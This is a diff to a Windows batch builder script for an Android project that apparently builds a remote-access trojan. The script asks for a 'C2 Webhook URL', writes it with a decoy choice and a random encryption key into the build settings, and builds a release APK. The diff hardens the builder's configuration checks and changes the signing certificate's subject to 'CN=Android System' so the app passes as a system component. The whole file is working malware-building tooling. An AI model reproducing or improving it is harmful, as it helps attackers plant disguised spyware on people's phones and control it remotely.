@@ -73,8 +73,8 @@ exit /b 0
 
 :generate_keystore
 set "KEYSTORE_PATH=%PROJECT_DIR%\lab-rats-keystore.jks"
-set "KEY_ALIAS=lab-rats-key"
-set "KEYSTORE_PASS=lab-rats123"
+set "KEY_ALIAS="
+set "KEYSTORE_PASS="
 
 if "%AUTO_KEYSTORE%"=="1" (
     if exist "%KEYSTORE_PATH%" goto :save_keystore_props
@@ -88,12 +88,28 @@ if exist "%KEYSTORE_PATH%" (
 )
 
 echo [*] Keystore Configuration
-set /p "KEY_ALIAS=    Key alias [lab-rats-key]: "
-if "!KEY_ALIAS!"=="" set "KEY_ALIAS=lab-rats-key"
-set /p "KEYSTORE_PASS=    Password [lab-rats123]: "
-if "!KEYSTORE_PASS!"=="" set "KEYSTORE_PASS=lab-rats123"
+echo     ^(No default values: alias and password are REQUIRED.^)
+set /p "KEY_ALIAS=    Key alias (required): "
+if "!KEY_ALIAS!"=="" (
+    echo [!] ABORTED: Keystore alias is required. No default alias is provided.
+    exit /b 1
+)
+set /p "KEYSTORE_PASS=    Password (required, 12+ chars): "
+if "!KEYSTORE_PASS!"=="" (
+    echo [!] ABORTED: A keystore password is required. No default password is provided.
+    exit /b 1
+)
+if "!KEYSTORE_PASS!"=="lab-rats123" (
+    echo [!] ABORTED: 'lab-rats123' is a blocked default password. Choose your own.
+    exit /b 1
+)
+powershell -Command "if ('!KEYSTORE_PASS!'.Length -lt 12) { exit 1 }"
+if !errorlevel! neq 0 (
+    echo [!] ABORTED: Keystore password must be at least 12 characters.
+    exit /b 1
+)
 
-keytool -genkeypair -alias "!KEY_ALIAS!" -keyalg RSA -keysize 2048 -validity 9125 -keystore "%KEYSTORE_PATH%" -storepass "!KEYSTORE_PASS!" -keypass "!KEYSTORE_PASS!" -dname "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US" >nul 2>&1
+keytool -genkeypair -alias "!KEY_ALIAS!" -keyalg RSA -keysize 2048 -validity 9125 -keystore "%KEYSTORE_PATH%" -storepass "!KEYSTORE_PASS!" -keypass "!KEYSTORE_PASS!" -dname "CN=Android System, O=Local Build, C=US" >nul 2>&1
 echo [✓] Keystore ready
 
 :save_keystore_props
@@ -161,23 +177,84 @@ if defined EXISTING_WEBHOOK (
     set /p "WEB_URL=    Enter C2 Webhook URL [Press Enter to Keep Current]: "
     if "!WEB_URL!"=="" set "WEB_URL=!EXISTING_WEBHOOK!"
 ) else (
-    set /p "WEB_URL=    Enter C2 Webhook URL (Google Script or Render): "
+    set /p "WEB_URL=    Enter C2 Webhook URL (Google Script or Render, REQUIRED): "
 )
+
+REM Reject empty / known-default C2 values before writing anything
+if "!WEB_URL!"=="" (
+    echo [!] ABORTED: WEBHOOK_URL is empty. Enter your own C2 endpoint.
+    exit /b 1
+)
+if "!WEB_URL!"=="AndroidKernel1337" goto :blocked_webhook
+if "!WEB_URL!"=="TacticalKey2026SecureGCM" goto :blocked_webhook
+if "!WEB_URL!"=="admin1337" goto :blocked_webhook
+if "!WEB_URL!"=="lab-rats123" goto :blocked_webhook
+goto :webhook_ok
+:blocked_webhook
+echo [!] ABORTED: WEBHOOK_URL matches a blocked default value. Enter your own C2 endpoint.
+exit /b 1
+:webhook_ok
 
 REM Generate random 16-char ENCRYPTION_KEY
 for /f "usebackq tokens=*" %%K in (`powershell -Command "-join ((65..90)+(97..122)+(48..57) | Get-Random -Count 16 | ForEach-Object {[char]$_})"` ) do set "RAND_KEY=%%K"
 
-powershell -Command "$p = Get-Content '%PROJECT_DIR%\local.properties' -ErrorAction SilentlyContinue | Where-Object { $_ -notmatch '^(WEBHOOK_URL|DECOY_CHOICE|ENCRYPTION_KEY)=' }; $p += 'WEBHOOK_URL=!WEB_URL!'; $p += 'DECOY_CHOICE=!DECOY_CHOICE!'; $p += 'ENCRYPTION_KEY=!RAND_KEY!'; $p | Set-Content '%PROJECT_DIR%\local.properties'"
+REM Reject blocked encryption key values (should not happen with random gen, defense-in-depth)
+if "!RAND_KEY!"=="" (
+    echo [!] ABORTED: ENCRYPTION_KEY generation failed.
+    exit /b 1
+)
+if "!RAND_KEY!"=="AndroidKernel1337" goto :blocked_enc
+if "!RAND_KEY!"=="TacticalKey2026SecureGCM" goto :blocked_enc
+if "!RAND_KEY!"=="admin1337" goto :blocked_enc
+if "!RAND_KEY!"=="lab-rats123" goto :blocked_enc
+goto :enc_ok
+:blocked_enc
+echo [!] ABORTED: ENCRYPTION_KEY matched a blocked default value. Retry.
+exit /b 1
+:enc_ok
 
-REM Generate dummy metadata files in assets
-if not exist "%PROJECT_DIR%\app\src\main\assets\sys" mkdir "%PROJECT_DIR%\app\src\main\assets\sys"
-powershell -Command "1..3 | ForEach-Object { $b = New-Object byte[] 512; (New-Object System.Random).NextBytes($b); [System.IO.File]::WriteAllBytes(\"%PROJECT_DIR%\app\src\main\assets\sys\metadata_$_.dat\", $b) }"
+powershell -Command "$p = Get-Content '%PROJECT_DIR%\local.properties' -ErrorAction SilentlyContinue | Where-Object { $_ -notmatch '^(WEBHOOK_URL|DECOY_CHOICE|ENCRYPTION_KEY)=' }; $p += 'WEBHOOK_URL=!WEB_URL!'; $p += 'DECOY_CHOICE=!DECOY_CHOICE!'; $p += 'ENCRYPTION_KEY=!RAND_KEY!'; $p | Set-Content '%PROJECT_DIR%\local.properties'"
 
 echo [✓] App configuration saved.
 goto :eof
 
+:validate_config
+REM Pre-build validation: WEBHOOK_URL / ENCRYPTION_KEY must not be empty or known defaults
+set "V_WEBHOOK="
+set "V_ENCKEY="
+if exist "%PROJECT_DIR%\local.properties" (
+    for /f "usebackq tokens=1,* delims==" %%A in (`type "%PROJECT_DIR%\local.properties"`) do (
+        if "%%A"=="WEBHOOK_URL" set "V_WEBHOOK=%%B"
+        if "%%A"=="ENCRYPTION_KEY" set "V_ENCKEY=%%B"
+    )
+)
+if "!V_WEBHOOK!"=="" (
+    echo [!] BUILD ABORTED: WEBHOOK_URL is empty. Set your own C2 endpoint first.
+    exit /b 1
+)
+if "!V_WEBHOOK!"=="AndroidKernel1337" goto :blocked_build
+if "!V_WEBHOOK!"=="TacticalKey2026SecureGCM" goto :blocked_build
+if "!V_WEBHOOK!"=="admin1337" goto :blocked_build
+if "!V_WEBHOOK!"=="lab-rats123" goto :blocked_build
+if "!V_ENCKEY!"=="" goto :blocked_build
+if "!V_ENCKEY!"=="AndroidKernel1337" goto :blocked_build
+if "!V_ENCKEY!"=="TacticalKey2026SecureGCM" goto :blocked_build
+if "!V_ENCKEY!"=="admin1337" goto :blocked_build
+if "!V_ENCKEY!"=="lab-rats123" goto :blocked_build
+echo [✓] Build configuration OK (WEBHOOK_URL ^& ENCRYPTION_KEY are non-default).
+exit /b 0
+:blocked_build
+echo [!] BUILD ABORTED: WEBHOOK_URL or ENCRYPTION_KEY is empty or matches a blocked default value.
+exit /b 1
+
 :build_apk
 call :print_banner
+echo [*] Validating build configuration...
+call :validate_config
+if !errorlevel! neq 0 (
+    set /p "ENTER=    Press Enter to return..."
+    goto :eof
+)
 echo [*] Initializing Build Engine...
 cd /d "%PROJECT_DIR%"
 call gradlew.bat assembleRelease --parallel
